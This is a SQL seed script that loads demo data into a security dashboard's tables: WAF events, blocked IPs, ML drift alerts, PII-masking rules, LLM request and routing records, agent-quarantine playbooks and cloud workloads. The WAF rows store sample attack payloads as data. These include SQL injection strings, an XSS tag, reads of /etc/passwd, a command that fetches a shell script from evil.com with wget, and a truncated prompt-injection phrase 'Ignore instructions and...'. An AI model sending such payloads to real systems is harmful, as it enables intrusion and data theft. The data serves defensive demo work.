-- 19_fortress_dashboard_seed.sql
-- Seed data for all fortress dashboard tables (OPER_RT19-095 §13.4)
-- Apply: psql -h 127.0.0.1 -p 5433 -U runtimeai_admin -d authzion -f qa_testing_local/seed/19_fortress_dashboard_seed.sql
-- Tenants: equinix-demo + runtime_trial4

DO $$
DECLARE
  tid      TEXT;
  tid_uuid UUID;
  acct_aws  UUID;
  acct_az   UUID;
  acct_gcp  UUID;
BEGIN

FOREACH tid IN ARRAY ARRAY['equinix-demo', 'runtime_trial4']
LOOP
  SELECT uuid INTO tid_uuid FROM tenants WHERE tenant_id = tid;
  IF tid_uuid IS NULL THEN
    RAISE NOTICE 'Tenant % not found, skipping', tid;
    CONTINUE;
  END IF;

  -- ── WAF Events ──────────────────────────────────────────────────────────────
  INSERT INTO waf_events (tenant_id, ts, attack_type, client_ip, path, method, action, risk_score, payload) VALUES
    (tid, NOW() - INTERVAL '2 hours',   'sqli',            '185.220.101.42', '/api/v1/users?id=1 OR 1=1',         'GET',  'block',   92, '{"query":"id=1 OR 1=1"}'),
    (tid, NOW() - INTERVAL '3 hours',   'xss',             '203.0.113.77',   '/api/v1/feedback',                  'POST', 'block',   78, '{"body":"<script>alert(1)</script>"}'),
    (tid, NOW() - INTERVAL '4 hours',   'bot',             '198.51.100.9',   '/api/v1/login',                     'POST', 'block',   65, '{"ua":"python-requests/2.28"}'),
    (tid, NOW() - INTERVAL '5 hours',   'rce',             '45.33.32.156',   '/api/v1/exec',                      'POST', 'block',   98, '{"cmd":"cat /etc/passwd"}'),
    (tid, NOW() - INTERVAL '6 hours',   'prompt_injection', '104.21.44.89', '/api/v1/llm/chat',                   'POST', 'block',   85, '{"prompt":"Ignore instructions and..."}'),
    (tid, NOW() - INTERVAL '7 hours',   'lfi',             '91.108.4.100',   '/api/v1/file?path=../../etc/passwd', 'GET',  'block',   88, null),
    (tid, NOW() - INTERVAL '8 hours',   'ddos',            '192.0.2.200',    '/api/v1/agents',                    'GET',  'block',   70, '{"rate":"850 req/s"}'),
    (tid, NOW() - INTERVAL '9 hours',   'sqli',            '185.220.101.55', '/api/v1/reports',                   'GET',  'monitor', 45, '{"query":"UNION SELECT"}'),
    (tid, NOW() - INTERVAL '10 hours',  'xss',             '198.51.100.22',  '/api/v1/search',                    'GET',  'monitor', 38, null),
    (tid, NOW() - INTERVAL '12 hours',  'bot',             '67.43.156.14',   '/api/v1/pricing',                   'GET',  'monitor', 30, '{"ua":"Scrapy/2.7"}'),
    (tid, NOW() - INTERVAL '14 hours',  'sqli',            '5.188.86.22',    '/api/v1/tenants/search',            'POST', 'block',   91, '{"filter":"'' OR ''1''=''1"}'),
    (tid, NOW() - INTERVAL '16 hours',  'rce',             '89.248.167.131', '/api/v1/pipeline/run',              'POST', 'block',   95, '{"cmd":";wget http://evil.com/sh"}'),
    (tid, NOW() - INTERVAL '20 hours',  'bot',             '162.158.92.7',   '/api/v1/agents/list',               'GET',  'allow',   15, null),
    (tid, NOW() - INTERVAL '24 hours',  'prompt_injection', '172.67.73.12', '/api/v1/llm/complete',               'POST', 'block',   79, null)
  ON CONFLICT DO NOTHING;

  -- ── WAF Blocked IPs ─────────────────────────────────────────────────────────
  -- Clean up any stale rows that lack a valid IP
  DELETE FROM waf_blocked_ips WHERE tenant_id = tid AND ip IS NULL;
  INSERT INTO waf_blocked_ips (tenant_id, ip, country, reason, block_count, blocked_since, expires_at) VALUES
    (tid, '185.220.101.42', 'RU', 'sqli',         47, NOW() - INTERVAL '2 hours',  NULL),
    (tid, '45.33.32.156',   'US', 'rce',           12, NOW() - INTERVAL '5 hours',  NOW() + INTERVAL '24 hours'),
    (tid, '89.248.167.131', 'NL', 'rce',            8, NOW() - INTERVAL '16 hours', NULL),
    (tid, '5.188.86.22',    'RU', 'sqli',          23, NOW() - INTERVAL '14 hours', NOW() + INTERVAL '7 days'),
    (tid, '91.108.4.100',   'DE', 'manual_block',   1, NOW() - INTERVAL '1 day',    NULL)
  ON CONFLICT (tenant_id, ip) DO NOTHING;

  -- ── ML Models ───────────────────────────────────────────────────────────────
  INSERT INTO ml_models (tenant_id, name, version, model_type, status, accuracy, drift_score, last_trained, predictions_24h) VALUES
    (tid, 'fraud-detector',     'v2.1', 'classification', 'healthy',  0.9840, 0.0120, NOW() - INTERVAL '3 days',  128400),
    (tid, 'churn-predictor',    'v1.4', 'regression',     'degraded', 0.8210, 0.2180, NOW() - INTERVAL '14 days', 45200),
    (tid, 'anomaly-classifier', 'v3.0', 'classification', 'healthy',  0.9620, 0.0450, NOW() - INTERVAL '1 day',   89700),
    (tid, 'cost-forecaster',    'v1.0', 'regression',     'training', 0.7800, 0.0800, NOW() - INTERVAL '30 days', 0)
  ON CONFLICT (tenant_id, name, version) DO NOTHING;

  -- ── ML Drift Alerts ─────────────────────────────────────────────────────────
  INSERT INTO ml_drift_alerts (tenant_id, model_name, model_version, drift_score, feature, severity, status, detected_at) VALUES
    (tid, 'churn-predictor',    'v1.4', 0.2180, 'tenure_months',     'critical', 'open',         NOW() - INTERVAL '2 hours'),
    (tid, 'churn-predictor',    'v1.4', 0.1650, 'monthly_charges',   'warning',  'open',         NOW() - INTERVAL '3 hours'),
    (tid, 'anomaly-classifier', 'v3.0', 0.0890, 'request_frequency', 'warning',  'acknowledged', NOW() - INTERVAL '6 hours'),
    (tid, 'fraud-detector',     'v2.1', 0.0450, 'transaction_amount','info',     'resolved',     NOW() - INTERVAL '12 hours')
  ON CONFLICT DO NOTHING;

  -- ── ML Anomalies ────────────────────────────────────────────────────────────
  INSERT INTO ml_anomalies (tenant_id, model_name, anomaly_type, score, description, severity, detected_at) VALUES
    (tid, 'fraud-detector',     'data_drift',      0.7820, 'Input distribution shifted: transaction_amount p95 increased 3.2x baseline', 'critical', NOW() - INTERVAL '1 hour'),
    (tid, 'churn-predictor',    'concept_drift',   0.5640, 'Prediction confidence dropped from 91% to 73% over last 48h',                'warning',  NOW() - INTERVAL '4 hours'),
    (tid, 'anomaly-classifier', 'feature_missing', 0.3210, 'Field user_agent_hash missing in 12% of recent inference requests',          'medium',   NOW() - INTERVAL '8 hours')
  ON CONFLICT DO NOTHING;

  -- ── ML Pipelines ────────────────────────────────────────────────────────────
  INSERT INTO ml_pipelines (tenant_id, name, model_name, status, stage, last_run, avg_duration_s, success_rate_pct) VALUES
    (tid, 'fraud-detector-retrain', 'fraud-detector',     'healthy', 'training',  NOW() - INTERVAL '3 days', 1840, 98.50),
    (tid, 'churn-weekly-batch',     'churn-predictor',    'degraded','inference', NOW() - INTERVAL '6 hours', 420,  84.20),
    (tid, 'anomaly-continuous',     'anomaly-classifier', 'healthy', 'inference', NOW() - INTERVAL '15 min',  12,   99.10)
  ON CONFLICT (tenant_id, name) DO NOTHING;

  -- ── Data Shield Rules ────────────────────────────────────────────────────────
  -- No unique constraint on (tenant_id, name) — delete then insert to avoid duplicates
  DELETE FROM data_shield_rules WHERE tenant_id = tid;
  INSERT INTO data_shield_rules (tenant_id, name, pattern, strategy, field_count, enabled, priority, last_triggered) VALUES
    (tid, 'SSN Masking',        '\b\d{3}-\d{2}-\d{4}\b',                          'mask',     1284, true, 10, NOW() - INTERVAL '30 min'),
    (tid, 'Email Tokenization', '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-Z]+',       'tokenize', 8921, true, 20, NOW() - INTERVAL '2 hours'),
    (tid, 'Credit Card Redact', '\b(?:\d[ -]*?){13,16}\b',                         'redact',   342,  true, 5,  NOW() - INTERVAL '1 day'),
    (tid, 'Phone Mask',         '\b\+?1?\s*\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b','mask',     2109, true, 15, NOW() - INTERVAL '4 hours');

  -- ── LLM Requests ────────────────────────────────────────────────────────────
  INSERT INTO llm_requests (tenant_id, ts, vendor, model, status, latency_ms, total_tokens, cost_usd) VALUES
    (tid, NOW() - INTERVAL '10 min',  'anthropic', 'claude-sonnet-4-6', 'ok',    1240, 4200, 0.021000),
    (tid, NOW() - INTERVAL '15 min',  'openai',    'gpt-4o',            'ok',    890,  3100, 0.031000),
    (tid, NOW() - INTERVAL '20 min',  'anthropic', 'claude-haiku-4-5',  'ok',    320,  1800, 0.000900),
    (tid, NOW() - INTERVAL '25 min',  'azure',     'gpt-4o',            'ok',    1100, 5200, 0.052000),
    (tid, NOW() - INTERVAL '30 min',  'anthropic', 'claude-sonnet-4-6', 'error', 5000, 0,    0.000000),
    (tid, NOW() - INTERVAL '35 min',  'openai',    'gpt-4o-mini',       'ok',    210,  900,  0.000135),
    (tid, NOW() - INTERVAL '40 min',  'anthropic', 'claude-opus-4-7',   'ok',    2100, 8400, 0.126000),
    (tid, NOW() - INTERVAL '1 hour',  'anthropic', 'claude-sonnet-4-6', 'ok',    1380, 3900, 0.019500),
    (tid, NOW() - INTERVAL '2 hours', 'openai',    'gpt-4o',            'ok',    760,  2800, 0.028000),
    (tid, NOW() - INTERVAL '4 hours', 'azure',     'gpt-4o',            'ok',    1050, 4800, 0.048000),
    (tid, NOW() - INTERVAL '6 hours', 'anthropic', 'claude-sonnet-4-6', 'ok',    1290, 4100, 0.020500),
    (tid, NOW() - INTERVAL '8 hours', 'openai',    'gpt-4o',            'error', 5000, 0,    0.000000),
    (tid, NOW() - INTERVAL '12 hours','anthropic',  'claude-haiku-4-5', 'ok',    310,  1600, 0.000800),
    (tid, NOW() - INTERVAL '24 hours','anthropic',  'claude-sonnet-4-6','ok',    1410, 4400, 0.022000)
  ON CONFLICT DO NOTHING;

  -- ── LLM Routing Rules ───────────────────────────────────────────────────────
  DELETE FROM llm_routing_rules WHERE tenant_id = tid;
  INSERT INTO llm_routing_rules (tenant_id, name, priority, strategy, vendor, model, primary_vendor, fallback_chain, fallback_action, fallback_vendor, fallback_model, enabled) VALUES
    (tid, 'Cost-Optimized Default',  100, 'cost',       'anthropic', 'claude-sonnet-4-6', 'anthropic', ARRAY['openai','azure'], 'next_vendor', 'openai',    'gpt-4o',       true),
    (tid, 'Low-Latency Realtime',     10, 'latency',    'openai',    'gpt-4o-mini',       'openai',    ARRAY['anthropic'],      'next_vendor', 'anthropic', 'claude-haiku-4-5', true),
    (tid, 'Compliance-Only Routing',  50, 'compliance', 'azure',     'gpt-4o',            'azure',     ARRAY['anthropic'],      'fail',        'anthropic', 'claude-opus-4-7',  true),
    (tid, 'High-Volume Batch',       200, 'cost',       'openai',    'gpt-4o-mini',       'openai',    ARRAY['azure','anthropic'],'next_vendor','azure',    'gpt-4-turbo',  false);

  -- ── AI Respond Playbooks ─────────────────────────────────────────────────────
  INSERT INTO ai_respond_playbooks (tenant_id, name, trigger, actions_count, enabled, executions_total, success_rate_pct, last_triggered) VALUES
    (tid, 'High-Risk Agent Quarantine', 'risk_score > 80', 3, true,  14, 92.86, NOW() - INTERVAL '3 hours'),
    (tid, 'PII Leak Response',          'pii_detected',    3, true,  89, 97.75, NOW() - INTERVAL '45 min')
  ON CONFLICT (tenant_id, name) DO NOTHING;

  -- ── AI Respond Log ───────────────────────────────────────────────────────────
  INSERT INTO ai_respond_log (tenant_id, ts, action, playbook, target, outcome, duration_ms) VALUES
    (tid, NOW() - INTERVAL '10 min',  'quarantine', 'High-Risk Agent Quarantine', 'agent:pay-bot-v2',     'success', 340),
    (tid, NOW() - INTERVAL '25 min',  'pii_block',  'PII Leak Response',          'agent:finance-bot',    'success', 120),
    (tid, NOW() - INTERVAL '1 hour',  'alert',      'High-Risk Agent Quarantine', 'agent:risk-analyzer',  'success', 85),
    (tid, NOW() - INTERVAL '2 hours', 'escalate',   'PII Leak Response',          'agent:data-extractor', 'success', 210),
    (tid, NOW() - INTERVAL '3 hours', 'quarantine', 'High-Risk Agent Quarantine', 'agent:llm-proxy',      'failed',  5000),
    (tid, NOW() - INTERVAL '4 hours', 'notify',     'PII Leak Response',          'agent:report-gen',     'success', 95),
    (tid, NOW() - INTERVAL '5 hours', 'pii_block',  'PII Leak Response',          'agent:etl-pipeline',   'success', 130),
    (tid, NOW() - INTERVAL '6 hours', 'quarantine', 'High-Risk Agent Quarantine', 'agent:code-executor',  'success', 290),
    (tid, NOW() - INTERVAL '8 hours', 'alert',      'High-Risk Agent Quarantine', 'agent:web-scraper',    'success', 75),
    (tid, NOW() - INTERVAL '10 hours','notify',     'PII Leak Response',          'agent:compliance-bot', 'success', 110)
  ON CONFLICT DO NOTHING;

  -- ── AI Respond Capabilities ──────────────────────────────────────────────────
  INSERT INTO ai_respond_capabilities (tenant_id, name, category, description, enabled, requires_approval) VALUES
    (tid, 'Behavioral Anomaly Detection', 'detection',  'Z-score baseline monitoring for all agent API calls. Fires when call frequency exceeds 2σ from baseline.', true,  false),
    (tid, 'Prompt Injection Shield',      'prevention', 'Classifies incoming LLM prompts for injection attempts using fine-tuned classifier. Blocks and logs.',     true,  false),
    (tid, 'Compliance Evidence Auto-Log', 'compliance', 'Automatically captures evidence artifacts for SOC 2 and ISO 27001 controls on every security event.',     false, true)
  ON CONFLICT (tenant_id, name) DO NOTHING;

  -- ── MCP Proxy Keys ───────────────────────────────────────────────────────────
  INSERT INTO mcp_proxy_keys (tenant_id, name, key_prefix, rate_limit, created_at, calls_total) VALUES
    (tid, 'fraud-agent-prod',   'rtpk_' || LEFT(tid,5) || '_FraudProd',   500, NOW() - INTERVAL '30 days', 184293),
    (tid, 'compliance-bot-key', 'rtpk_' || LEFT(tid,5) || '_Compliance',  200, NOW() - INTERVAL '14 days', 42187)
  ON CONFLICT DO NOTHING;

  -- ── NHI Registry ─────────────────────────────────────────────────────────────
  -- Use (tenant_id, name) unique constraint — update last_seen to avoid stale epochs
  INSERT INTO nhis (id, tenant_id, name, caller_type, description, vault_path, risk_score, risk_level, status, last_seen, enrolled_at)
  VALUES
    (tid || '-sa-fraud',       tid, 'sa-fraud-pipeline',  'ServiceAccount', 'Fraud detection ML pipeline service account', 'secret/fraud/sa',       72, 'high',   'active', NOW() - INTERVAL '2 hours',  NOW() - INTERVAL '90 days'),
    (tid || '-api-compliance', tid, 'api-key-compliance', 'ApiKey',         'Compliance reporting API key',                'secret/compliance/key', 61, 'medium', 'active', NOW() - INTERVAL '6 hours',  NOW() - INTERVAL '60 days'),
    (tid || '-svc-data',       tid, 'svc-data-pipeline',  'ServiceAccount', 'Data ingestion pipeline service account',     'secret/data/sa',        45, 'medium', 'active', NOW() - INTERVAL '1 day',    NOW() - INTERVAL '45 days'),
    (tid || '-token-llm',      tid, 'token-llm-gateway',  'ApiKey',         'LLM gateway bearer token',                    'secret/llm/token',      38, 'low',    'active', NOW() - INTERVAL '3 hours',  NOW() - INTERVAL '30 days'),
    (tid || '-cert-mtls',      tid, 'cert-mtls-agent',    'Certificate',    'Agent mTLS client certificate',               'secret/certs/agent',    28, 'low',    'active', NOW() - INTERVAL '12 hours', NOW() - INTERVAL '14 days')
  ON CONFLICT (tenant_id, name) DO UPDATE SET last_seen = EXCLUDED.last_seen, risk_score = EXCLUDED.risk_score;

  INSERT INTO nhi_credentials (tenant_id, nhi_id, credential_type, vault_path, last_rotated, expires_at, status)
  SELECT tid, n.id, cred_type, vault, rotated, exp, 'active'
  FROM (VALUES
    ('sa-fraud-pipeline',  'api_key',     'secret/fraud/sa',       NOW() - INTERVAL '30 days', NOW() + INTERVAL '60 days'),
    ('api-key-compliance', 'api_key',     'secret/compliance/key', NOW() - INTERVAL '90 days', NOW() + INTERVAL '7 days'),
    ('svc-data-pipeline',  'api_key',     'secret/data/sa',        NOW() - INTERVAL '15 days', NOW() + INTERVAL '120 days'),
    ('token-llm-gateway',  'api_key',     'secret/llm/token',      NOW() - INTERVAL '7 days',  NOW() + INTERVAL '45 days'),
    ('cert-mtls-agent',    'certificate', 'secret/certs/agent',    NOW() - INTERVAL '5 days',  NOW() + INTERVAL '180 days')
  ) AS v(nhi_name, cred_type, vault, rotated, exp)
  JOIN nhis n ON n.tenant_id = tid AND n.name = v.nhi_name
  ON CONFLICT DO NOTHING;

  -- ── NHI Baseline Points (Z-score chart) ──────────────────────────────────────
  INSERT INTO nhi_baseline_points (tenant_id, nhi_id, ts, z_score, call_count)
  SELECT
    tid,
    n.id,
    NOW() - (gs * INTERVAL '1 day'),
    ROUND(CAST(
      CASE WHEN gs <= 5  THEN 2.5 + (random() * 0.8)
           WHEN gs <= 10 THEN 1.1 + (random() * 0.6)
           WHEN gs <= 20 THEN 0.2 + (random() * 0.5)
           ELSE -0.1 + (random() * 0.4)
      END AS numeric), 4),
    ROUND(CAST(420 + (random() * 230) AS numeric))
  FROM generate_series(1, 30) AS gs
  CROSS JOIN nhis n
  WHERE n.tenant_id = tid AND n.name IN ('sa-fraud-pipeline','api-key-compliance')
  ON CONFLICT DO NOTHING;

  -- ── Cloud Accounts (UUID tenant_id) ──────────────────────────────────────────
  INSERT INTO cloud_accounts (tenant_id, provider, account_id, display_name, status)
  VALUES
    (tid_uuid, 'aws',   '123456789012',  'AWS Production',    'active'),
    (tid_uuid, 'azure', 'sub-aabbccdd',  'Azure Corp Tenant', 'active'),
    (tid_uuid, 'gcp',   'proj-rt19-data','GCP Data Platform', 'active')
  ON CONFLICT (tenant_id, provider, account_id) DO NOTHING;

  -- Get account IDs for workload FK
  SELECT id INTO acct_aws FROM cloud_accounts WHERE tenant_id = tid_uuid AND provider = 'aws'   LIMIT 1;
  SELECT id INTO acct_az  FROM cloud_accounts WHERE tenant_id = tid_uuid AND provider = 'azure' LIMIT 1;
  SELECT id INTO acct_gcp FROM cloud_accounts WHERE tenant_id = tid_uuid AND provider = 'gcp'   LIMIT 1;

  -- ── Cloud Workloads (UUID tenant_id, UUID account_id FK) ─────────────────────
  IF acct_aws IS NOT NULL THEN
    INSERT INTO cloud_workloads (tenant_id, account_id, resource_type, resource_id, region, risk_score, governance_status, last_seen_at) VALUES
      (tid_uuid, acct_aws, 'ec2',    'i-0abc123api',     'us-east-1',  12.0, 'governed',   NOW() - INTERVAL '30 min'),
      (tid_uuid, acct_aws, 'ec2',    'i-0def456llm',     'us-east-1',  45.0, 'governed',   NOW() - INTERVAL '1 hour'),
      (tid_uuid, acct_aws, 'lambda', 'fraud-detect-fn',  'us-west-2',   8.0, 'governed',   NOW() - INTERVAL '2 hours'),
      (tid_uuid, acct_aws, 'ecs',    'data-proc-svc',    'eu-west-1',  78.0, 'discovered', NOW() - INTERVAL '3 hours')
    ON CONFLICT (account_id, resource_id) DO NOTHING;
  END IF;

  IF acct_az IS NOT NULL THEN
    INSERT INTO cloud_workloads (tenant_id, account_id, resource_type, resource_id, region, risk_score, governance_status, last_seen_at) VALUES
      (tid_uuid, acct_az, 'pod',       'aks-agent-cluster',    'eastus',     38.0, 'governed',   NOW() - INTERVAL '45 min'),
      (tid_uuid, acct_az, 'container', 'azure-functions-prod',  'westeurope', 15.0, 'governed',   NOW() - INTERVAL '90 min')
    ON CONFLICT (account_id, resource_id) DO NOTHING;
  END IF;

  IF acct_gcp IS NOT NULL THEN
    INSERT INTO cloud_workloads (tenant_id, account_id, resource_type, resource_id, region, risk_score, governance_status, last_seen_at) VALUES
      (tid_uuid, acct_gcp, 'pod',       'gke-ml-pipeline', 'us-central1', 92.0, 'discovered', NOW() - INTERVAL '1 hour'),
      (tid_uuid, acct_gcp, 'container', 'cloud-run-api',   'us-central1', 41.0, 'discovered', NOW() - INTERVAL '4 hours')
    ON CONFLICT (account_id, resource_id) DO NOTHING;
  END IF;

  RAISE NOTICE 'Fortress seed loaded for tenant: % (uuid: %)', tid, tid_uuid;
END LOOP;
END $$;
